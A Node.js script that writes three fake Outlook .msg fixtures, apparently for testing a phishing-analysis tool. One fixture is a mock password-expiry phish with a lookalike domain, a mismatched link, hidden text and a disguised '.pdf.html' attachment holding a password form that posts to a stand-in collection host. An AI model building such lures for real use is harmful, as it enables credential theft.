#!/usr/bin/env node
// Build small Outlook .msg files for tests, so .msg support can be tested with made-up, harmless content
// (real .msg samples are rarely shareable). Writes test/fixtures/m01…m03.msg.
//
//   node scripts/make-msg.mjs
//
// A .msg is a compound file (CFB) of MAPI properties ([MS-OXMSG]): strings as UTF-16LE "__substg1.0_XXXX001F"
// streams, binary as "…0102", fixed-size values in "__properties_version1.0". Only what the tests need is written.
import CFB from 'cfb';
import { readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = fileURLToPath(new URL('..', import.meta.url)), fx = n => join(root, 'test', 'fixtures', n);
const utf16 = s => Buffer.from(s + '\0', 'utf16le');
const tag = (id, type) => id.toString(16).toUpperCase().padStart(4, '0') + type;

/** Compressed-RTF container in its "uncompressed" form (MELA): valid for any RTF reader, no compressor needed. */
function melaRtf(rtf) {
  const body = Buffer.from(rtf, 'latin1'), h = Buffer.alloc(16);
  h.writeUInt32LE(body.length + 12, 0); h.writeUInt32LE(body.length, 4); h.write('MELA', 8, 'latin1'); h.writeUInt32LE(0, 12);
  return Buffer.concat([h, body]);
}

/** Properties stream: header (32 bytes top level, 24 for an embedded message, 8 for attachments/recipients) + fixed values. */
function propsStream(kind, fixed, counts = {}) {
  const head = Buffer.alloc(kind === 'top' ? 32 : kind === 'embedded' ? 24 : 8);
  if (kind !== 'part') { head.writeUInt32LE(counts.recipients || 0, 8); head.writeUInt32LE(counts.attachments || 0, 12); head.writeUInt32LE(counts.recipients || 0, 16); head.writeUInt32LE(counts.attachments || 0, 20); }
  const entries = fixed.map(([t, v]) => { const e = Buffer.alloc(16); e.writeUInt32LE(parseInt(t, 16), 0); e.writeUInt32LE(6, 4); e.writeUInt32LE(v, 8); return e; });
  return Buffer.concat([head, ...entries]);
}

/** Add one message (top level or embedded) under `base` ('' for the root storage). */
function addMessage(cfb, base, m, kind) {
  const put = (name, data) => CFB.utils.cfb_add(cfb, base + name, data);
  const atts = m.attachments || [], recips = m.to || [];
  put('__properties_version1.0', propsStream(kind, [], { recipients: recips.length, attachments: atts.length }));
  put(`__substg1.0_${tag(0x001a, '001F')}`, utf16('IPM.Note'));
  if (m.subject !== undefined) put(`__substg1.0_${tag(0x0037, '001F')}`, utf16(m.subject));
  if (m.headers) put(`__substg1.0_${tag(0x007d, '001F')}`, utf16(m.headers));
  if (m.senderName) put(`__substg1.0_${tag(0x0c1a, '001F')}`, utf16(m.senderName));
  if (m.senderEmail) { put(`__substg1.0_${tag(0x0c1f, '001F')}`, utf16(m.senderEmail)); put(`__substg1.0_${tag(0x5d01, '001F')}`, utf16(m.senderEmail)); }
  if (m.body !== undefined) put(`__substg1.0_${tag(0x1000, '001F')}`, utf16(m.body));
  if (m.rtf) put(`__substg1.0_${tag(0x1009, '0102')}`, melaRtf(m.rtf));
  recips.forEach((r, i) => {
    const p = `${base}__recip_version1.0_#${i.toString(16).toUpperCase().padStart(8, '0')}/`;
    CFB.utils.cfb_add(cfb, p + '__properties_version1.0', propsStream('part', [[tag(0x0c15, '0003'), 1]]));
    CFB.utils.cfb_add(cfb, p + `__substg1.0_${tag(0x3001, '001F')}`, utf16(r.name || r.email));
    CFB.utils.cfb_add(cfb, p + `__substg1.0_${tag(0x39fe, '001F')}`, utf16(r.email));
  });
  atts.forEach((a, i) => {
    const p = `${base}__attach_version1.0_#${i.toString(16).toUpperCase().padStart(8, '0')}/`;
    CFB.utils.cfb_add(cfb, p + '__properties_version1.0', propsStream('part', [[tag(0x3705, '0003'), a.message ? 5 : 1]]));
    CFB.utils.cfb_add(cfb, p + `__substg1.0_${tag(0x3707, '001F')}`, utf16(a.name));
    CFB.utils.cfb_add(cfb, p + `__substg1.0_${tag(0x3704, '001F')}`, utf16(a.name));
    if (a.message) addMessage(cfb, p + `__substg1.0_${tag(0x3701, '000D')}/`, a.message, 'embedded');
    else { CFB.utils.cfb_add(cfb, p + `__substg1.0_${tag(0x3701, '0102')}`, Buffer.from(a.data)); if (a.type) CFB.utils.cfb_add(cfb, p + `__substg1.0_${tag(0x370e, '001F')}`, utf16(a.type)); }
  });
}

function buildMsg(m) {
  const cfb = CFB.utils.cfb_new();
  for (const n of ['00020102', '00030102', '00040102']) CFB.utils.cfb_add(cfb, `__nameid_version1.0/__substg1.0_${n}`, Buffer.alloc(0));
  addMessage(cfb, '', m, 'top');
  CFB.utils.cfb_del(cfb, '\u0001Sh33tJ5');   // the library's placeholder stream
  return Buffer.from(CFB.write(cfb, { type: 'buffer' }));
}

// ── fixtures (made up; every domain is a reserved .test/.example name) ─────────
const phishHeaders = [
  'Received: from mail.northwlnd.test (mail.northwlnd.test [198.51.100.77]) by AM1PEPF000012AB.mail.protection.outlook.com with Microsoft SMTP Server (version=TLS1_2) id 15.20.8000.1; Mon, 19 Oct 2026 13:00:02 +0000',
  'Authentication-Results: spf=pass (sender IP is 198.51.100.77) smtp.mailfrom=northwlnd.test; dkim=none (message not signed) header.d=none;dmarc=none action=none header.from=northwlnd.test;compauth=softpass reason=201',
  'X-Forefront-Antispam-Report: CIP:198.51.100.77;CTRY:NL;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:mail.northwlnd.test;PTR:InfoDomainNonexistent;CAT:NONE;SFS:;DIR:INB;',
  'Return-Path: <it-helpdesk@northwlnd.test>', 'From: "Northwind IT Helpdesk" <it-helpdesk@northwlnd.test>', 'To: <j.cole@northwind.example>',
  'Subject: Your password expires today', 'Date: Mon, 19 Oct 2026 13:00:00 +0000', 'Message-ID: <m1@mail.northwlnd.test>', 'MIME-Version: 1.0',
  'Content-Type: multipart/alternative; boundary="was-here"', ''].join('\r\n');
// HTML wrapped in RTF the way Outlook stores it ([MS-OXRTFEX]).
const htmlInRtf = String.raw`{\rtf1\ansi\ansicpg1252\fromhtml1 \deff0{\fonttbl{\f0\fswiss Arial;}}` +
  String.raw`{\*\htmltag19 <html>}{\*\htmltag50 <body>}\htmlrtf {\htmlrtf0` +
  String.raw`{\*\htmltag64 <p>}Your Northwind password expires today. Keep your current password here:\htmlrtf\par\htmlrtf0{\*\htmltag72 </p>}` +
  String.raw`{\*\htmltag84 <a href="https://login.northwlnd.test/keep?u=j.cole@northwind.example">}https://portal.northwind.example/password{\*\htmltag92 </a>}` +
  String.raw`{\*\htmltag64 <div style="display:none">}quarterly newsletter order receipt{\*\htmltag72 </div>}` +
  String.raw`\htmlrtf }{\*\htmltag58 </body>}{\*\htmltag27 </html>}}`;
const phish = {
  subject: 'Your password expires today', headers: phishHeaders, senderName: 'Northwind IT Helpdesk', senderEmail: 'it-helpdesk@northwlnd.test',
  to: [{ name: 'Jordan Cole', email: 'j.cole@northwind.example' }], body: 'Your Northwind password expires today. Keep your current password here: https://portal.northwind.example/password',
  rtf: htmlInRtf,
  attachments: [{ name: 'Password_Policy.pdf.html', type: 'application/pdf',
    data: '<!doctype html><html><body><p>Test fixture: harmless.</p><form action="https://login.northwlnd.test/collect" method="post"><input type="password" name="p"></form></body></html>' }],
};
writeFileSync(fx('m01-phish-with-headers.msg'), buildMsg(phish));

// A user's report, saved as .msg, with the phish attached as an Outlook item.
writeFileSync(fx('m02-report-with-attached-item.msg'), buildMsg({
  subject: 'FW: Your password expires today',
  headers: ['Received: from AM0PR02MB3333.eurprd02.prod.outlook.com ([fe80::1]) by AM0PR02MB3333.eurprd02.prod.outlook.com with mapi id 15.20.8000.010; Mon, 19 Oct 2026 13:20:00 +0000',
    'X-MS-Exchange-Organization-AuthAs: Internal', 'From: Jordan Cole <j.cole@northwind.example>', 'To: Northwind SOC <soc@northwind.example>',
    'Subject: FW: Your password expires today', 'Date: Mon, 19 Oct 2026 13:20:00 +0000', 'Message-ID: <rep-m2@AM0PR02MB3333.eurprd02.prod.outlook.com>', ''].join('\r\n'),
  senderName: 'Jordan Cole', senderEmail: 'j.cole@northwind.example', to: [{ name: 'Northwind SOC', email: 'soc@northwind.example' }],
  body: 'Reporting this one, it looks like phishing.',
  attachments: [{ name: 'Your password expires today', message: phish }],
}));

// No internet headers (as when saved from Sent Items) and plain RTF with a HYPERLINK field: links must still be found.
writeFileSync(fx('m03-rtf-hyperlink-no-headers.msg'), buildMsg({
  subject: 'Shared document', senderName: 'Sam Patel', senderEmail: 'sam.patel@contoso-legal.test', to: [{ email: 'j.cole@northwind.example' }],
  body: 'A document has been shared with you.',
  rtf: String.raw`{\rtf1\ansi\ansicpg1252\deff0{\fonttbl{\f0 Calibri;}}\f0 A document has been shared with you: ` +
    String.raw`{\field{\*\fldinst{HYPERLINK "https://docs-share-4471.web.app/view"}}{\fldrslt{docs.contoso-legal.test/shared}}}\par}`,
}));
console.log('Wrote m01-phish-with-headers.msg, m02-report-with-attached-item.msg, m03-rtf-hyperlink-no-headers.msg');
